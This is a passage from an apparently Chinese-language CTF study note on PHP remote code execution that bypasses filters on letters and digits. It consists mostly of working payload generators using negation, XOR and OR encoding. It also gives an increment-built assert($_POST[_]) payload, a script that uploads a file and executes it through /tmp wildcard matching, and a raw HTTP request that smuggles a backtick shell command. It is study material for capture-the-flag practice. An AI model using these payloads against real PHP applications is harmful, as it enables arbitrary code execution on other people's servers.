class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;(~&quot;</span>.<span class="variable">$a</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;,~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;,&#x27;&#x27;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>构造脚本2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="异或绕过">异或绕过</h5><p>通过不可见字符之间的异或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每次使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可</p><p>xor.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9A-Z]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p><a href="http://xor.py">xor.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h5 id="或绕过">或绕过</h5><p>通过不可见字符之间的或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每次使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可</p><p>or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p><a href="http://or.py">or.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment"># 没有将php写入环境变量需手动运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h5 id="自增绕过">自增绕过</h5><p>通过php的自增特性，构造出恶意字符串assert($_POST[_]);，进而实现任意代码执行</p><p>何为自增？</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123195735901.png" alt="image-20240123195735901"></p><p>我们可以发现，A在进行++操作之后变成了B，规律遵循ascii码表，详见开头。以下为构造脚本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>测试发现<span class="number">7.0</span>.<span class="number">12</span>以上版本不可使用</span><br><span class="line"><span class="regexp">//</span>使用时需要url编码下</span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;$_&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 assert(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   _=phpinfo();</span><br></pre></td></tr></table></figure><h5 id="临时文件执行">临时文件执行</h5><p>此方法的适用环境稍有不同，以上手法皆为eval类的无字母数字命令执行，而此方法适用于system类命令执行</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://url/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, b<span class="string">&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        print(r.<span class="built_in">text</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>我们通过发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。由于字母数字被过滤，所以所有的字母数字都用?通配符代替</p><p><strong>关于正则部分</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br></pre></td></tr></table></figure><p>根据观察，文件的最后一位必定为大写字母，所以可以通过正则强制匹配大写字符增加成功几率，详见开头ascii码表</p><p><strong>关于.</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. filename</span><br></pre></td></tr></table></figure><p>用当前的shell执行一个文件中的命令。当前运行的shell是bash，则. file的意思就是用bash执行filename文件中的命令。所以我们就可以用.来执行我们上传的恶意文件</p><p>参考请求包</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?shell<span class="operator">=</span>?&gt;&lt;?<span class="operator">=</span>`.+/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f[<span class="variable">%40</span>-[]`<span class="variable">%3</span>b?&gt; HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">43.210</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span><span class="comment">; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span></span><br><span class="line">Accept: text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml<span class="comment">;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line">Accept-Language: zh-CN<span class="punctuation">,</span>zh<span class="comment">;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line">Content-Type:multipart/form-data<span class="comment">;boundary=--------123</span></span><br><span class="line">Accept-Encoding: gzip<span class="punctuation">,</span> deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Length: <span class="number">109</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-123</span></span><br><span class="line">Content-Disposition:form-data<span class="comment">;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line">---------<span class="number">-123</span>--</span><br></pre></td></tr></table></figure><h4 id="有或无参数rce">有或无参数rce</h4><p>所谓无参数rce就是利用各种已定义函数的复杂搭配，在eval命令执行的条件下成功构造我们所需的恶意代码的操作。例如下方简介表格中的最后一条代码串。</p><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="常见函数及简介">常见函数及简介</h5><table><thead><tr><th>函数</th><th>效果</th></tr></thead><tbody><tr><td>include()</td><td>包含文件内容</td></tr><tr><td>require()</td><td>包含文件内容</td></tr><tr><td>include_once()</td><td>包含文件内容</td></tr><tr><td>require_once()</td><td>包含文件内容</td></tr><tr><td>foreach($a as $x =&gt; 